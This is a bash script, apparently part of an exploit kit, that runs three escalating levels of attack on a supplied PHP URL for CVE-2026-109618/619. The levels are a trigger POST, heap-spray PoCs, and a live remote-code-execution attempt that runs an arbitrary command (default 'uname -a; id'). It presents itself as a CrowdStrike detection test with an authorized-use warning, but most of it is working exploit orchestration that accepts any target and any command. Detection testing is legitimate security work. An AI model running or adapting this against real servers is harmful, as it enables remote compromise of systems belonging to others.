#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# test_live_target.sh — CVE-2026-109618/619 detection test against YOUR server
#
# Tests all 3 levels against your own CrowdStrike-monitored server:
#   Level 1: poc_trigger.py  (minimal trigger, 258B)
#   Level 2: poc0/poc1       (trigger + heap spray, no RCE)
#   Level 3: framework       (full exploit attempt with offsets)
#
# Usage:
#   bash test_live_target.sh --url https://myserver.example.com/index.php
#   bash test_live_target.sh --url https://myserver.example.com/index.php --dtor 0x4304d0
#   bash test_live_target.sh --url https://myserver.example.com/index.php --dtor 0x4304d0 --level 3
#
# AUTHORIZED USE ONLY — run only against infrastructure you own.
# ─────────────────────────────────────────────────────────────────────────────
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPORT_FILE="${SCRIPT_DIR}/live_test_$(date +%Y%m%d_%H%M%S).txt"

RED='\033[0;31m'; YEL='\033[1;33m'; GRN='\033[0;32m'; CYA='\033[0;36m'; RST='\033[0m'

URL=""
DTOR="0"
LEVEL="2"
COMMAND="uname -a; id; echo JACKALPOC"
STALL="1.4"
SID=""

usage() {
  echo "Usage: $0 --url <target_url> [--dtor <hex>] [--level 1|2|3] [--command <cmd>] [--stall <sec>]"
  echo ""
  echo "  --url      Target URL (your PHP endpoint, e.g. https://myserver.com/index.php)"
  echo "  --dtor     zval_ptr_dtor address from target binary (hex, e.g. 0x4304d0)"
  echo "             Required for level 3. Get it with: python3 bin/php_up_framework.py --syms --binary /path/to/php"
  echo "  --level    Test level: 1=trigger only, 2=trigger+spray (default), 3=full exploit"
  echo "  --command  Command for RCE payload (default: 'uname -a; id; echo JACKALPOC')"
  echo "  --stall    Stall time in seconds between chunks (default: 1.4)"
  exit 1
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --url)     URL="$2"; shift 2 ;;
    --dtor)    DTOR="$2"; shift 2 ;;
    --level)   LEVEL="$2"; shift 2 ;;
    --command) COMMAND="$2"; shift 2 ;;
    --stall)   STALL="$2"; shift 2 ;;
    --sid)     SID="$2"; shift 2 ;;
    -h|--help) usage ;;
    *)         echo "Unknown option: $1"; usage ;;
  esac
done

[[ -z "$URL" ]] && { echo -e "${RED}Error: --url is required${RST}"; usage; }

if [[ "$LEVEL" == "3" && "$DTOR" == "0" ]]; then
  echo -e "${RED}Error: --dtor is required for level 3 (full exploit)${RST}"
  echo -e "Run on the target server: python3 bin/php_up_framework.py --syms --binary /path/to/php"
  exit 1
fi

log() { echo -e "$1" | tee -a "$REPORT_FILE"; }

separator() {
  log "${CYA}════════════════════════════════════════════════════════════════════${RST}"
}

separator
log "${CYA}  CVE-2026-109618/619 — Live Target Detection Test${RST}"
log "${CYA}  $(date -u '+%Y-%m-%d %H:%M:%S UTC')${RST}"
log "${CYA}  Target:  ${URL}${RST}"
log "${CYA}  Level:   ${LEVEL}  Dtor: ${DTOR}  Stall: ${STALL}s${RST}"
separator
log ""

# ── Pre-flight ────────────────────────────────────────────────────────────
log "[*] Pre-flight check..."
PREFLIGHT=$(curl -s -o /dev/null -w "%{http_code}|%{time_total}|%{ssl_verify_result}" \
  --max-time 10 "${URL}" 2>/dev/null) || PREFLIGHT="FAIL"
HTTP_CODE=$(echo "$PREFLIGHT" | cut -d'|' -f1)
LATENCY=$(echo "$PREFLIGHT" | cut -d'|' -f2)
log "[*] Target responds: HTTP ${HTTP_CODE}, latency ${LATENCY}s"

if [[ "$HTTP_CODE" == "000" || "$HTTP_CODE" == "FAIL" ]]; then
  log "${RED}[!] Target unreachable — aborting${RST}"
  exit 1
fi

HEADERS=$(curl -sI --max-time 10 "${URL}" 2>/dev/null)
PHP_HEADER=$(echo "$HEADERS" | grep -i "x-powered-by" | head -1)
SERVER_HEADER=$(echo "$HEADERS" | grep -i "^server:" | head -1)
[[ -n "$PHP_HEADER" ]] && log "[*] ${PHP_HEADER}"
[[ -n "$SERVER_HEADER" ]] && log "[*] ${SERVER_HEADER}"
log ""

# ══════════════════════════════════════════════════════════════════════════
# LEVEL 1 — Minimal trigger
# ══════════════════════════════════════════════════════════════════════════
separator
log "${CYA}  LEVEL 1 — Minimal Trigger (258-byte writeup body)${RST}"
log "${CYA}  Expected CS detection: suspicious POST / upload_progress field${RST}"
separator

TRIGGER_SID="${SID:-$(python3 -c "import uuid; print(uuid.uuid4().hex)")}"
log "[*] Session ID: ${TRIGGER_SID}"

log "[*] 1a) Single-shot trigger..."
RESP_1A=$(curl -s -w "\n---HTTP_CODE:%{http_code}---" \
  -X POST \
  -H "Content-Type: multipart/form-data; boundary=----b" \
  -H "Cookie: PHPSESSID=${TRIGGER_SID}" \
  -F "PHPSESSID=${TRIGGER_SID}" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=x" \
  -F "f=@/dev/null;filename=a" \
  --max-time 15 \
  "${URL}" 2>/dev/null) || RESP_1A="CONNECTION_ERROR"
CODE_1A=$(echo "$RESP_1A" | grep -o 'HTTP_CODE:[0-9]*' | cut -d: -f2)
log "[*] Response: HTTP ${CODE_1A:-ERR}"
log "[*] Body: $(echo "$RESP_1A" | head -3 | head -c 200)"
log ""

log "[*] 1b) Stall-based trigger (${STALL}s gap)..."
RESP_1B=$(python3 -I -c "
import socket, ssl, time
from urllib.parse import urlparse

url = '${URL}'
sid = '${TRIGGER_SID}'
stall = ${STALL}

u = urlparse(url)
host, port = u.hostname, u.port or (443 if u.scheme == 'https' else 80)
path = u.path or '/'
use_tls = u.scheme == 'https'

BOUNDARY = b'----b'
body_start = (
    b'--' + BOUNDARY + b'\r\n'
    b'Content-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n'
    + sid.encode() + b'\r\n'
    b'--' + BOUNDARY + b'\r\n'
    b'Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n'
    b'x\r\n'
    b'--' + BOUNDARY + b'\r\n'
    b'Content-Disposition: form-data; name=\"f\"; filename=\"a\"\r\n\r\n'
)
chunk1 = b'A' * 5184
chunk2 = b'B' * 5184
closing = b'\r\n--' + BOUNDARY + b'--\r\n'
full_body = body_start + chunk1 + chunk2 + closing
split_at = len(body_start) + len(chunk1)

head = (
    f'POST {path} HTTP/1.1\r\n'
    f'Host: {host}\r\n'
    f'User-Agent: Mozilla/5.0\r\n'
    f'Cookie: PHPSESSID={sid}\r\n'
    f'Content-Type: multipart/form-data; boundary={BOUNDARY.decode()}\r\n'
    f'Content-Length: {len(full_body)}\r\n'
    f'Connection: close\r\n'
    f'\r\n'
).encode()

try:
    raw = socket.create_connection((host, port), timeout=15)
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    if use_tls:
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(raw, server_hostname=host)
    else:
        s = raw
    s.sendall(head + full_body[:split_at])
    time.sleep(stall)
    s.sendall(full_body[split_at:])
    s.settimeout(15)
    resp = b''
    while True:
        try:
            d = s.recv(4096)
            if not d: break
            resp += d
        except socket.timeout: break
    s.close()
    status = resp.split(b'\r\n', 1)[0].decode('latin1', 'replace') if resp else 'NO-RESPONSE'
    print(f'STATUS:{status}')
    print(f'SIZE:{len(resp)}')
except Exception as e:
    print(f'ERROR:{e}')
" 2>&1) || RESP_1B="PYTHON_ERR"
log "[*] Fallback result: ${RESP_1B}"
log ""

if [[ "$LEVEL" == "1" ]]; then
  separator
  log "${GRN}  Level 1 complete. Check CrowdStrike console for detections.${RST}"
  log "  Report: ${REPORT_FILE}"
  separator
  exit 0
fi

# ══════════════════════════════════════════════════════════════════════════
# LEVEL 2 — Trigger + Heap Spray
# ══════════════════════════════════════════════════════════════════════════
separator
log "${CYA}  LEVEL 2 — Trigger + Heap Spray (149-element packed reclaim)${RST}"
log "${CYA}  Expected CS detection: exploit pattern / process crash / anomalous POST${RST}"
separator

SPRAY_SID="${SID:-$(python3 -c "import uuid; print(uuid.uuid4().hex)")}"
log "[*] Session ID: ${SPRAY_SID}"

log "[*] 2a) CVE-2026-109618 — stale outer (post_bytes_processed)..."
RESP_618=$(python3 -I "${SCRIPT_DIR}/bin/poc0_109618.py" \
  "${URL}" \
  --sid "${SPRAY_SID}" \
  --stall "${STALL}" \
  --dtor "${DTOR}" \
  --command "${COMMAND}" \
  2>&1) || true
log "$RESP_618"
log ""

sleep 2

SPRAY_SID2="${SID:-$(python3 -c "import uuid; print(uuid.uuid4().hex)")}"
log "[*] 2b) CVE-2026-109619 — stale inner (current_file_bytes_processed)..."
RESP_619=$(python3 -I "${SCRIPT_DIR}/bin/poc1_109619.py" \
  "${URL}" \
  --sid "${SPRAY_SID2}" \
  --stall "${STALL}" \
  --dtor "${DTOR}" \
  --command "${COMMAND}" \
  2>&1) || true
log "$RESP_619"
log ""

if [[ "$LEVEL" == "2" ]]; then
  separator
  log "${CYA}  Level 2 complete. Check CrowdStrike for:${RST}"
  log "  - Falcon console > Activity > Detections"
  log "  - Falcon console > Investigate > Hosts > [your server]"
  log "  - Look for: SuspiciousPostRequest / ExploitAttempt / ProcessCrash / HeapSpray"
  log "  Report: ${REPORT_FILE}"
  separator
  exit 0
fi

# ══════════════════════════════════════════════════════════════════════════
# LEVEL 3 — Full exploit attempt
# ══════════════════════════════════════════════════════════════════════════
separator
log "${RED}  LEVEL 3 — Full Exploit Attempt (with real offsets)${RST}"
log "${RED}  Expected CS detection: RCE / command execution / anomalous process tree${RST}"
separator

LIVE_SID="${SID:-$(python3 -c "import uuid; print(uuid.uuid4().hex)")}"
log "[*] Session ID: ${LIVE_SID}"

log "[*] 3a) Framework --live, bug 619..."
RESP_FW619=$(python3 -I "${SCRIPT_DIR}/bin/php_up_framework.py" \
  --live "${URL}" \
  --bug 619 \
  --sid "${LIVE_SID}" \
  --stall "${STALL}" \
  --dtor "${DTOR}" \
  --command "${COMMAND}" \
  2>&1) || true
log "$RESP_FW619"
log ""

sleep 2

LIVE_SID2="${SID:-$(python3 -c "import uuid; print(uuid.uuid4().hex)")}"
log "[*] 3b) Framework --live, bug 618..."
RESP_FW618=$(python3 -I "${SCRIPT_DIR}/bin/php_up_framework.py" \
  --live "${URL}" \
  --bug 618 \
  --sid "${LIVE_SID2}" \
  --stall "${STALL}" \
  --dtor "${DTOR}" \
  --command "${COMMAND}" \
  2>&1) || true
log "$RESP_FW618"
log ""

separator
log "${CYA}  Level 3 complete. Check CrowdStrike for:${RST}"
log "  - Falcon console > Activity > Detections"
log "  - Falcon console > Investigate > Hosts > [your server]"
log "  - Endpoint Detection: ProcessCreation (id, uname) under php-fpm/lsphp"
log "  - Network: large POST with multipart boundary + 149 repeated parts"
log "  - Memory: heap-use-after-free / segfault in php-fpm worker"
log "  Report: ${REPORT_FILE}"
separator
